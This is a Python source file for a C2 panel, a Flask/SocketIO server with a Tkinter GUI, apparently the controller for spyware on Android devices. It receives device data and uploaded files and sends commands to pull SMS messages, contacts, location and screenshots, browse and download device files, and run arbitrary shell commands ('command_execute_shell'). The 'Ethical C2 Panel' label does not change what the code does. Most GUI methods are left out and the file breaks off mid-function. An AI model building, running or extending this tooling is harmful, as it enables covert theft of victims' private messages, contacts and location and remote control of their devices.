# c2_panel/app.py

import os
import json
import datetime
import threading
import logging
import webbrowser
import subprocess  # For opening files
import sys  # For platform check

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk

# --- Basic Settings ---
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
os.makedirs(DATA_RECEIVED_DIR, exist_ok=True)
DEVICE_TAGS_FILE = os.path.join(APP_ROOT, "device_tags.json")

# Flask and SocketIO Setup
app = Flask(__name__)
app.config["SECRET_KEY"] = (
    "Jk8lP1yH3rT9uV5bX2sE7qZ4oW6nD0fA_MODIFIED_FINAL_V5"  # تحديث طفيف آخر
)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("C2Panel")

connected_clients_sio = {}
device_tags = {}  # {deviceId_folder_name: "tag1,tag2"}
gui_app = None


def load_device_tags():
    global device_tags
    try:
        if os.path.exists(DEVICE_TAGS_FILE):
            with open(DEVICE_TAGS_FILE, "r", encoding="utf-8") as f:
                device_tags = json.load(f)
            logger.info(
                f"Loaded {len(device_tags)} device tags from {DEVICE_TAGS_FILE}"
            )
    except Exception as e:
        logger.error(f"Error loading device tags: {e}", exc_info=True)
        device_tags = {}


def save_device_tags():
    try:
        with open(DEVICE_TAGS_FILE, "w", encoding="utf-8") as f:
            json.dump(device_tags, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved device tags to {DEVICE_TAGS_FILE}")
    except Exception as e:
        logger.error(f"Error saving device tags: {e}", exc_info=True)


# --- Flask API Endpoints ---
@app.route("/")
def index():
    return "C2 Panel is Running. Waiting for connections..."


@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    logger.info("Request to /upload_initial_data")
    try:
        json_data_str = request.form.get("json_data")
        if not json_data_str:
            logger.error("No json_data found in /upload_initial_data request.")
            return jsonify({"status": "error", "message": "Missing json_data"}), 400

        data = json.loads(json_data_str)
        raw_device_id = data.get("deviceId")
        device_info_for_fallback = data.get("deviceInfo", {})

        if (
            not raw_device_id
            or not isinstance(raw_device_id, str)
            or len(raw_device_id) < 3
        ):
            model = device_info_for_fallback.get("model", "unknown_model")
            name = device_info_for_fallback.get("deviceName", "unknown_device")
            raw_device_id = f"{model}_{name}_{datetime.datetime.now().strftime('%S%f')}"
            logger.warning(f"Using fallback deviceId for initial_data: {raw_device_id}")

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in raw_device_id
        )
        if (
            not device_id_sanitized
            or device_id_sanitized.lower()
            in ["unknown_model_unknown_device", "_", "unknown_device_unknown_model"]
            or len(device_id_sanitized) < 3
        ):
            device_id_sanitized = f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)
        info_file_name = (
            f'info_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        info_file_path = os.path.join(device_folder_path, info_file_name)
        with open(info_file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved JSON from /upload_initial_data to {info_file_path}")

        image_file = request.files.get("image")
        if image_file and image_file.filename:
            filename = os.path.basename(image_file.filename)
            base, ext = os.path.splitext(filename)
            if not ext:
                ext = ".jpg"
            image_filename = (
                f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            )
            image_path = os.path.join(device_folder_path, image_filename)
            image_file.save(image_path)
            logger.info(f"Saved image from /upload_initial_data to {image_path}")

        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"Initial data received via HTTP from: {device_id_sanitized}"
            )
            gui_app.refresh_historical_device_list()
        return jsonify({"status": "success", "message": "Initial data received"}), 200
    except json.JSONDecodeError as e:
        logger.error(
            f"Invalid JSON in /upload_initial_data: {request.form.get('json_data', '')[:100]}... Error: {e}"
        )
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400
    except Exception as e:
        logger.error(f"Error processing /upload_initial_data: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {str(e)}"}),
            500,
        )


@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    logger.info("Request to /upload_command_file")
    try:
        device_id = request.form.get("deviceId")
        command_ref = request.form.get("commandRef", "unknown_cmd_ref")
        command_id_from_req = request.form.get("commandId", "N_A")
        if not device_id:
            logger.error("'deviceId' missing.")
            return jsonify({"status": "error", "message": "Missing deviceId"}), 400

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)

        file_data = request.files.get("file")
        if file_data and file_data.filename:
            original_filename = os.path.basename(file_data.filename)
            base, ext = os.path.splitext(original_filename)
            if not ext:
                ext = ".dat"
            safe_command_ref = "".join(c if c.isalnum() else "_" for c in command_ref)
            safe_command_id = (
                "".join(c if c.isalnum() else "_" for c in command_id_from_req)
                if command_id_from_req != "N_A"
                else "no_id"
            )
            new_filename = f"{safe_command_ref}_{base}_{safe_command_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            file_path = os.path.join(device_folder_path, new_filename)
            file_data.save(file_path)
            logger.info(
                f"Saved cmd file '{new_filename}' for dev '{device_id_sanitized}' (CmdID: {command_id_from_req}) to {file_path}"
            )

            if gui_app and gui_app.master.winfo_exists():
                gui_app.add_system_log(
                    f"Received file '{new_filename}' from dev '{device_id_sanitized}' (Ref: {command_ref}, CmdID: {command_id_from_req})."
                )
                if gui_app.current_selected_historical_device_id == device_id_sanitized:
                    gui_app.display_device_details(device_id_sanitized)
            return (
                jsonify(
                    {
                        "status": "success",
                        "message": "File received by C2",
                        "filename_on_server": new_filename,
                    }
                ),
                200,
            )
        else:
            logger.error("No file data in /upload_command_file or filename empty.")
            return jsonify({"status": "error", "message": "Missing file data"}), 400
    except Exception as e:
        logger.error(f"Error in /upload_command_file: {e}", exc_info=True)
        return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500


# --- SocketIO Event Handlers ---
@socketio.on("connect")
def handle_sio_connect():
    client_sid = request.sid
    logger.info(
        f"Client trying to connect: SID={client_sid}, IP={request.remote_addr}. Requesting registration."
    )
    emit(
        "request_registration_info",
        {"message": "Please register device."},
        room=client_sid,
    )


@socketio.on("disconnect")
def handle_sio_disconnect():
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        device_info = connected_clients_sio.pop(client_sid)
        dev_id_display = device_info.get("id", client_sid)
        logger.info(
            f"Device '{dev_id_display}' disconnected (SID={client_sid}, IP={device_info.get('ip','N/A')})."
        )
        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{dev_id_display}' disconnected (SocketIO)."
            )
            if gui_app.current_selected_live_client_sid == client_sid:
                gui_app._enable_commands(False)
                gui_app.current_selected_live_client_sid = None
    else:
        logger.warning(
            f"Unknown client disconnected: SID={client_sid}, IP={request.remote_addr}."
        )


@socketio.on("register_device")
def handle_register_device(data):
    client_sid = request.sid
    try:
        device_identifier = data.get("deviceId")
        device_name_display = data.get("deviceName", f"Device_{client_sid[:6]}")
        device_platform = data.get("platform", "Unknown")

        if not device_identifier:
            logger.error(
                f"Registration failed for SID {client_sid}: 'deviceId' missing. Data: {data}"
            )
            emit(
                "registration_failed",
                {"message": "Missing 'deviceId' in registration payload."},
                room=client_sid,
            )
            return

        connected_clients_sio[client_sid] = {
            "sid": client_sid,
            "id": device_identifier,
            "name_display": device_name_display,
            "platform": device_platform,
            "ip": request.remote_addr,
            "connected_at": datetime.datetime.now().isoformat(),
            "last_seen": datetime.datetime.now().isoformat(),
        }
        logger.info(
            f"Device registered: ID='{device_identifier}', Name='{device_name_display}', SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            "registration_successful",
            {
                "message": "Successfully registered.",
                "sid": client_sid,
                "deviceId": device_identifier,
            },
            room=client_sid,
        )

        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{device_name_display}' (ID: {device_identifier}) connected via SocketIO from {request.remote_addr}."
            )
            if gui_app.current_selected_historical_device_id == device_identifier:
                gui_app._enable_commands(True)
                gui_app.current_selected_live_client_sid = client_sid
    except Exception as e:
        logger.error(
            f"Error in handle_register_device for SID {client_sid}: {e}", exc_info=True
        )
        if gui_app and gui_app.master.winfo_exists():
            emit(
                "registration_failed",
                {"message": f"Server error: {str(e)}"},
                room=client_sid,
            )


@socketio.on("client_data")
def handle_client_data(data):
    client_sid = request.sid
    try:
        if client_sid not in connected_clients_sio:
            device_id_from_data = (
                data.get("deviceId") if isinstance(data, dict) else None
            )
            if device_id_from_data:
                logger.info(
                    f"Data from unregistered SID {client_sid} has deviceId '{device_id_from_data}'. Attempting auto-registration."
                )
                handle_register_device(data)  # Try to register based on this data
            else:
                logger.warning(
                    f"Received client_data from unknown SID {client_sid}. Requesting registration. Data: {str(data)[:200]}"
                )
                emit(
                    "request_registration_info",
                    {"message": "Unknown device, please register."},
                    room=client_sid,
                )
                return

        if (
            client_sid in connected_clients_sio
        ):  # Check again after potential auto-registration
            connected_clients_sio[client_sid][
                "last_seen"
            ] = datetime.datetime.now().isoformat()
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list_item(client_sid)

            device_info = connected_clients_sio[client_sid]
            device_id_str = device_info.get("id", f"SID_{client_sid}")

            if isinstance(data, dict):
                data_type = data.get("type", "generic_client_data")
                logger.debug(
                    f"Received '{data_type}' from {device_id_str}: {str(data)[:200]}"
                )
                if data_type not in [
                    "client_connected",
                    "unknown_command_response",
                    "screenshot_result",
                ]:
                    if gui_app and gui_app.master.winfo_exists():
                        gui_app.display_command_response(
                            device_id_str, data_type, "received_client_data", data
                        )
                elif data_type == "unknown_command_response":
                    if gui_app and gui_app.master.winfo_exists():
                        gui_app.display_command_response(
                            device_id_str,
                            data.get("command_received", "unknown"),
                            "error_on_client",
                            data,
                        )
            else:
                logger.info(
                    f"Received non-dict client_data from {device_id_str}: {str(data)[:200]}"
                )
    except Exception as e:
        logger.error(
            f"Error in handle_client_data for SID {client_sid}: {e}", exc_info=True
        )


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        connected_clients_sio[client_sid][
            "last_seen"
        ] = datetime.datetime.now().isoformat()
        if gui_app and gui_app.master.winfo_exists():
            gui_app.update_live_clients_list_item(client_sid)
    else:
        logger.warning(
            f"Heartbeat from unknown SID: {client_sid}. Data: {data}. Requesting registration."
        )
        emit(
            "request_registration_info",
            {"message": "Unrecognized heartbeat, please re-register."},
            room=client_sid,
        )


def send_command_to_client(target_id, command_name, args=None):
    args = args or {}
    sid_to_use = (
        target_id
        if target_id in connected_clients_sio
        else next(
            (s for s, i in connected_clients_sio.items() if i.get("id") == target_id),
            None,
        )
    )

    if not sid_to_use:
        errmsg = f"Target device '{target_id}' not live for command '{command_name}'."
        logger.error(errmsg)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Command Error", errmsg, parent=gui_app.master)
        return {"status": "error", "message": errmsg, "command_id": None}

    dev_id = connected_clients_sio[sid_to_use]["id"]
    cmd_id = f"{command_name.replace('command_','')}_{datetime.datetime.now().strftime('%H%M%S%f')}"
    payload = {"command": command_name, "command_id": cmd_id, "args": args}
    logger.info(
        f"Sending cmd '{command_name}' (ID: {cmd_id}) to dev '{dev_id}' (SID: {sid_to_use}) with args: {args}"
    )
    try:
        socketio.emit("command", payload, to=sid_to_use)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"Sent cmd '{command_name}' (ID: {cmd_id}) to dev '{dev_id}'."
            )
        return {"status": "sent", "command_id": cmd_id}
    except Exception as e_emit:
        errmsg = f"Error emitting cmd '{command_name}' to SID {sid_to_use}: {e_emit}"
        logger.error(errmsg, exc_info=True)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Socket Emit Error", errmsg, parent=gui_app.master)
            gui_app.add_system_log(errmsg, error=True)
        return {"status": "error", "message": errmsg, "command_id": cmd_id}


@socketio.on("command_response")
def handle_command_response(data):
    client_sid = request.sid
    dev_info = connected_clients_sio.get(client_sid)
    if not dev_info:
        logger.warning(
            f"Cmd response from unknown SID: {client_sid}. Data: {str(data)[:100]}"
        )
        emit("request_registration_info", room=client_sid)
        return

    dev_id = dev_info.get("id", f"SID_{client_sid}")
    cmd = data.get("command", "unknown")
    cmd_id = data.get("command_id", "N/A")
    status = data.get("status", "N/A")
    payload = data.get("payload", {})
    logger.info(
        f"Response for '{cmd}' (ID: {cmd_id}) from '{dev_id}'. Status: {status}."
    )
    if status == "error":
        logger.error(
            f"Error from '{dev_id}' for '{cmd} (ID: {cmd_id})': {payload.get('message', payload)}"
        )

    if gui_app and gui_app.master.winfo_exists():
        gui_app.add_system_log(
            f"Response for '{cmd}' (ID: {cmd_id}) from '{dev_id}': {status}"
        )
        gui_app.display_command_response(dev_id, cmd, status, payload, cmd_id)
        # If a file was uploaded as a result of this response (e.g., SMS dump), refresh stored files
        if (
            "filename_on_server" in payload
            or "_dump_file" in payload.get("message", "").lower()
        ) and gui_app.current_selected_historical_device_id == dev_id:
            gui_app.display_device_details(dev_id)


# --- GUI Class (C2PanelGUI) ---
class C2PanelGUI:
    def __init__(self, master):
        self.master = master
        master.title("Ethical C2 Panel - v0.7.1")
        master.geometry("1450x950")
        master.minsize(1200, 750)

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"))
        self.style.configure(
            "TLabelframe.Label", font=("Segoe UI", 10, "bold"), foreground="teal"
        )

        self.current_selected_historical_device_id = None
        self.current_selected_live_client_sid = None
        self.current_device_files_tree_items = {}

        # --- Main Paned Window ---
        self.paned_window = ttk.PanedWindow(master, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # --- Left Pane ---
        self.left_pane = ttk.Frame(self.paned_window, width=500)
        self.paned_window.add(self.left_pane, weight=2)

        # Historical Devices
        hist_devices_frame = ttk.LabelFrame(
            self.left_pane, text="Stored Device Data (Folders)"
        )
        hist_devices_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        hist_list_frame = ttk.Frame(hist_devices_frame)
        hist_list_frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=5)
        self.hist_device_listbox = tk.Listbox(
            hist_list_frame, selectmode=tk.SINGLE, height=10, exportselection=False
        )
        self.hist_device_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        hist_scrollbar = ttk.Scrollbar(
            hist_list_frame, orient=tk.VERTICAL, command=self.hist_device_listbox.yview
        )
        hist_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_device_listbox.config(yscrollcommand=hist_scrollbar.set)
        self.hist_device_listbox.bind(
            "<<ListboxSelect>>", self.on_historical_device_select
        )
        hist_actions_frame = ttk.Frame(hist_devices_frame)
        hist_actions_frame.pack(fill=tk.X, padx=5, pady=(2, 5))
        self.edit_tag_button = ttk.Button(
            hist_actions_frame,
            text="Edit Tag",
            command=self.edit_selected_device_tag,
            state=tk.DISABLED,
        )
        self.edit_tag_button.pack(side=tk.LEFT, padx=(0, 5))

        # Live Devices
        live_clients_frame = ttk.LabelFrame(
            self.left_pane, text="Live Connected Devices (SocketIO)"
        )
        live_clients_frame.pack(pady=(10, 5), padx=5, fill=tk.BOTH, expand=True)
        live_tree_frame = ttk.Frame(live_clients_frame)
        live_tree_frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=5)
        self.live_clients_tree = ttk.Treeview(
            live_tree_frame,
            columns=(
                "device_id",
                "name_display",
                "tags",
                "ip",
                "connected_at",
                "last_seen",
                "sid",
            ),
            show="headings",
            height=10,
        )
        cols = {
            "device_id": (130, "Device ID"),
            "name_display": (110, "Display Name"),
            "tags": (80, "Tags"),
            "ip": (100, "IP Address"),
            "connected_at": (140, "Connected"),
            "last_seen": (140, "Last Seen"),
            "sid": (0, "Session ID"),
        }
        for col_id, (width, text) in cols.items():
            self.live_clients_tree.heading(col_id, text=text)
            self.live_clients_tree.column(
                col_id, width=width, anchor=tk.W, stretch=(col_id != "sid")
            )
        live_scrollbar = ttk.Scrollbar(
            live_tree_frame, orient=tk.VERTICAL, command=self.live_clients_tree.yview
        )
        self.live_clients_tree.configure(yscrollcommand=live_scrollbar.set)
        self.live_clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        live_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_tree.bind("<<TreeviewSelect>>", self.on_live_client_select)

        # --- Right Pane (Notebook) ---
        self.right_pane = ttk.Frame(self.paned_window)
        self.paned_window.add(self.right_pane, weight=5)  # Increased weight
        self.notebook = ttk.Notebook(self.right_pane)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Tab 1: Device Details & Files
        self.device_details_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.device_details_tab, text="Device Details & Files")
        details_top_container = ttk.Frame(self.device_details_tab)
        details_top_container.pack(fill=tk.X, pady=5, padx=5)
        self.device_details_frame = ttk.LabelFrame(
            details_top_container, text="Device Information (Stored)"
        )
        self.device_details_frame.pack(
            side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5)
        )
        self.device_info_text = scrolledtext.ScrolledText(
            self.device_details_frame,
            height=7,
            width=50,
            wrap=tk.WORD,
            font=("Segoe UI", 9),
        )
        self.device_info_text.pack(pady=5, padx=5, fill=tk.X, expand=True)
        self.device_info_text.config(state=tk.DISABLED)

        stored_files_frame = ttk.LabelFrame(
            details_top_container, text="Stored Files (on C2 Server)"
        )
        stored_files_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        self.files_listbox = tk.Listbox(
            stored_files_frame,
            selectmode=tk.SINGLE,
            height=7,
            exportselection=False,
            font=("Segoe UI", 9),
        )
        self.files_listbox.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.files_listbox.bind("<<ListboxSelect>>", self.on_file_select)
        self.open_stored_file_button = ttk.Button(
            stored_files_frame,
            text="Open Selected Stored File",
            command=self.open_selected_stored_file,
            state=tk.DISABLED,
        )
        self.open_stored_file_button.pack(pady=(2, 5))

        self.device_file_browser_frame = ttk.LabelFrame(
            self.device_details_tab, text="Live File Browser (Live Device)"
        )
        self.device_file_browser_frame.pack(
            pady=(10, 0), padx=5, fill=tk.BOTH, expand=True
        )
        path_controls_frame = ttk.Frame(self.device_file_browser_frame)
        path_controls_frame.pack(fill=tk.X, pady=2, padx=2)
        ttk.Label(path_controls_frame, text="Current Path:").pack(
            side=tk.LEFT, padx=(0, 5)
        )
        self.current_path_label = ttk.Label(
            path_controls_frame, text="/", relief=tk.GROOVE, anchor=tk.W, padding=(5, 2)
        )
        self.current_path_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.file_browser_tree_frame = ttk.Frame(self.device_file_browser_frame)
        self.file_browser_tree_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.file_browser_tree = ttk.Treeview(
            self.file_browser_tree_frame,
            columns=("type", "size", "modified", "perms", "full_path"),
            show="tree headings",
            height=8,
        )
        fb_cols = {
            "#0": (200, "Name", tk.W, tk.YES),
            "type": (50, "Type", tk.CENTER),
            "size": (80, "Size (KB)", tk.E),
            "modified": (120, "Modified", tk.W),
            "perms": (70, "Perms", tk.W),
            "full_path": (0, "Full Path", tk.W, tk.NO),
        }
        for col_id, (width, text, anchor, stretch) in fb_cols.items():
            self.file_browser_tree.heading(col_id, text=text)
            self.file_browser_tree.column(
                col_id, width=width, anchor=anchor, stretch=stretch
            )
        fb_yscoll = ttk.Scrollbar(
            self.file_browser_tree_frame,
            orient=tk.VERTICAL,
            command=self.file_browser_tree.yview,
        )
        fb_xscroll = ttk.Scrollbar(
            self.file_browser_tree_frame,
            orient=tk.HORIZONTAL,
            command=self.file_browser_tree.xview,
        )
        self.file_browser_tree.configure(
            yscrollcommand=fb_yscoll.set, xscrollcommand=fb_xscroll.set
        )
        self.file_browser_tree.grid(row=0, column=0, sticky="nsew")
        fb_yscoll.grid(row=0, column=1, sticky="ns")
        fb_xscroll.grid(row=1, column=0, sticky="ew")
        self.file_browser_tree_frame.grid_rowconfigure(0, weight=1)
        self.file_browser_tree_frame.grid_columnconfigure(0, weight=1)
        self.file_browser_tree.bind("<Double-1>", self.on_file_browser_double_click)
        self.file_browser_tree.bind("<<TreeviewSelect>>", self.on_file_browser_select)
        browser_buttons_frame = ttk.Frame(self.device_file_browser_frame)
        browser_buttons_frame.pack(fill=tk.X, pady=(5, 0), padx=2)
        self.download_device_file_button = ttk.Button(
            browser_buttons_frame,
            text="Request Download of Selected File",
            command=self.request_device_file_download,
            state=tk.DISABLED,
        )
        self.download_device_file_button.pack(side=tk.LEFT, padx=(0, 5))
        self.go_up_button = ttk.Button(
            browser_buttons_frame,
            text="Go Up ..",
            command=self.file_browser_go_up,
            state=tk.DISABLED,
        )
        self.go_up_button.pack(side=tk.LEFT)

        preview_frame = ttk.LabelFrame(
            self.device_details_tab, text="Stored File Preview / Info"
        )
        preview_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.preview_text = scrolledtext.ScrolledText(
            preview_frame, height=6, width=80, wrap=tk.WORD, font=("Consolas", 9)
        )
        self.preview_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.preview_text.config(state=tk.DISABLED)

        # Tab 2: Commands
        self.commands_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.commands_tab, text="Commands")
        commands_content_frame = ttk.Frame(self.commands_tab)
        commands_content_frame.pack(fill=tk.BOTH, expand=True)
        commands_buttons_frame = ttk.LabelFrame(
            commands_content_frame, text="Send Commands (to Selected Live Device)"
        )
        commands_buttons_frame.pack(pady=10, padx=10, fill=tk.X, expand=False)
        btn_config = [
            ("Get Device Info (N/A)", self.send_get_device_info_stub, 0, 0),
            ("List Files", self.send_list_files, 0, 1),
            ("Get Location", self.send_get_location, 0, 2),
            ("Take Screenshot", self.send_take_picture, 0, 3),
            ("Req. Upload File", self.send_upload_specific_file, 1, 0),
            ("Get SMS", self.send_get_sms, 1, 1),
            ("Get Contacts", self.send_get_contacts, 1, 2),
        ]
        for text, cmd, r, c in btn_config:
            btn = ttk.Button(commands_buttons_frame, text=text, command=cmd)
            btn.grid(row=r, column=c, padx=5, pady=5, sticky="ew")
            if text == "Get Device Info (N/A)":
                self.get_info_btn = btn  # Keep ref if needed
            elif text == "List Files":
                self.list_files_btn = btn
            elif text == "Get Location":
                self.get_location_btn = btn
            elif text == "Take Screenshot":
                self.take_picture_btn = btn
            elif text == "Req. Upload File":
                self.upload_file_btn = btn
            elif text == "Get SMS":
                self.get_sms_btn = btn
            elif text == "Get Contacts":
                self.get_contacts_btn = btn
        for i in range(4):
            commands_buttons_frame.columnconfigure(i, weight=1)

        custom_cmd_outer_frame = ttk.LabelFrame(
            commands_content_frame, text="Custom Command"
        )
        custom_cmd_outer_frame.pack(pady=10, padx=10, fill=tk.X, expand=False)
        custom_cmd_frame = ttk.Frame(custom_cmd_outer_frame)
        custom_cmd_frame.pack(pady=5, padx=5, fill=tk.X)
        ttk.Label(custom_cmd_frame, text="Cmd Name:").grid(
            row=0, column=0, padx=(0, 2), pady=5, sticky=tk.W
        )
        self.custom_cmd_entry = ttk.Entry(custom_cmd_frame, width=25)
        self.custom_cmd_entry.grid(row=0, column=1, padx=(0, 5), pady=5, sticky=tk.EW)
        self.custom_cmd_entry.insert(0, "command_execute_shell")
        ttk.Label(custom_cmd_frame, text="Args (JSON):").grid(
            row=1, column=0, padx=(0, 2), pady=5, sticky=tk.W
        )
        self.custom_args_entry = ttk.Entry(custom_cmd_frame, width=50)
        self.custom_args_entry.grid(
            row=1, column=1, columnspan=3, padx=(0, 5), pady=5, sticky=tk.EW
        )
        self.custom_args_entry.insert(
            0,
            '{"command_name": "getprop", "command_args": ["ro.build.version.release"]}',
        )  # Example: get Android version
        self.custom_cmd_btn = ttk.Button(
            custom_cmd_frame, text="Send Custom", command=self.send_custom_command
        )
        self.custom_cmd_btn.grid(
            row=0, column=2, rowspan=2, padx=5, pady=5, ipady=10, sticky="ns"
        )
        custom_cmd_frame.columnconfigure(1, weight=1)

        response_frame = ttk.LabelFrame(
            commands_content_frame, text="Command Responses"
        )
        response_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        self.response_text = scrolledtext.ScrolledText(
            response_frame, height=10, width=80, wrap=tk.WORD, font=("Consolas", 9)
        )
        self.response_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.response_text.config(state=tk.DISABLED)

        # Tab 3: System Log
        self.log_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.log_tab, text="System Log")
        log_frame = ttk.LabelFrame(self.log_tab, text="System Events")
        log_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        self.log_text = scrolledtext.ScrolledText(
            log_frame, height=30, width=100, wrap=tk.WORD, font=("Consolas", 9)
        )
        self.log_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)

        # Tab 4: Settings
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text="Settings")
        settings_content_frame = ttk.Frame(self.settings_tab)
        settings_content_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        server_info_frame = ttk.LabelFrame(settings_content_frame, text="Server Info")
        server_info_frame.pack(pady=5, padx=5, fill=tk.X, expand=False)
        ttk.Label(server_info_frame, text="Server Status:").grid(
            row=0, column=0, padx=5, pady=5, sticky=tk.W
        )
        self.server_status_label = ttk.Label(
            server_info_frame, text="Running", foreground="green"
        )
        self.server_status_label.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        ttk.Label(server_info_frame, text="Live Connected Devices:").grid(
            row=1, column=0, padx=5, pady=5, sticky=tk.W
        )
        self.connected_count_label = ttk.Label(server_info_frame, text="0")
        self.connected_count_label.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        actions_frame = ttk.LabelFrame(settings_content_frame, text="Actions")
        actions_frame.pack(pady=10, padx=5, fill=tk.X, expand=False)
        self.refresh_hist_btn = ttk.Button(
            actions_frame,
            text="Refresh Stored Devices List",
            command=self.refresh_historical_device_list,
        )
        self.refresh_hist_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.refresh_live_btn = ttk.Button(
            actions_frame,
            text="Refresh Live Devices List",
            command=self.update_live_clients_list,
        )
        self.refresh_live_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.clear_log_btn = ttk.Button(
            actions_frame, text="Clear System Log", command=self.clear_system_log
        )
        self.clear_log_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self._enable_commands(False)  # Disable commands initially
        self.refresh_historical_device_list()
        self.update_live_clients_list()
        self.add_system_log("C2 Panel GUI initialized.")

    # --- (بقية دوال C2PanelGUI كما هي من الردود السابقة، مع التأكد من دمج جميع الدوال الجديدة والمعدلة) ---
    # مثل: edit_selected_device_tag, _enable_commands, on_historical_device_select, on_live_client_select,
    # on_file_select, on_file_browser_select, display_device_details, display_command_response,
    # on_file_browser_double_click, file_browser_go_up, request_device_file_download, open_selected_stored_file,
    # send_get_device_info_stub, send_list_files, send_get_location, send_take_picture,
    # send_upload_specific_file, send_custom_command, send_get_sms, send_get_contacts
    # refresh_historical_device_list, update_live_clients_list, update_live_clients_list_item,
    # add_system_log, clear_system_log, open_image_viewer, save_image_as


# --- Main Function ---
def main():
    global gui_app
    load_device_tags()  # Load tags at startup

    def run_flask():
        logger.info("Starting Flask-SocketIO server on 0.0.0.0:5000")
        try:
            socketio.run(
                app,
                host="0.0.0.0",
                port=5000,
                debug=False,
                use_reloader=False,
                allow_unsafe_werkzeug=True,
            )
        except OSError as e_os:  # More specific error for port in use
            logger.critical(
                f"COULD NOT START FLASK SERVER (OS Error): {e_os}", exc_info=True
            )
            if "address already in use" in str(e_os).lower():
                errmsg = f"Port 5000 is already in use. Please close the other application using it."
            else:
                errmsg = f"Could not start C2 server on port 5000: {e_os}"

            if gui_app and gui_app.master.winfo_exists():
                gui_app.master.after(
                    100,
                    lambda: messagebox.showerror(
                        "FATAL SERVER ERROR", f"{errmsg}\n\nThe panel will exit."
                    ),
                )
                gui_app.master.after(500, gui_app.master.destroy)
            else:
                print(f"FATAL SERVER ERROR: {errmsg}. Exiting.")
                os._exit(1)
        except Exception as e:  # Catch other potential errors
            logger.critical(
                f"COULD NOT START FLASK SERVER (General Error): {e}", exc_info=True
            )
            if gui_app and gui_app.master.winfo_exists():
                gui_app.master.after(
                    100,
                    lambda: messagebox.showerror(
                        "FATAL SERVER ERROR",
                        f"Could not start C2 server: {e}\n\nThe panel will exit.",
                    ),
                )
                gui_app.master.after(500, gui_app.master.destroy)
            else:
                print(f"FATAL SERVER ERROR: Could not start C2 server: {e}. Exiting.")
                os._exit(1)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    root = tk.Tk()
    gui_app = C2PanelGUI(root)
    try:
        logger.info("C2 Panel GUI started. Server in background thread.")
        gui_app.add_system_log("Flask server thread started. Panel is ready.")
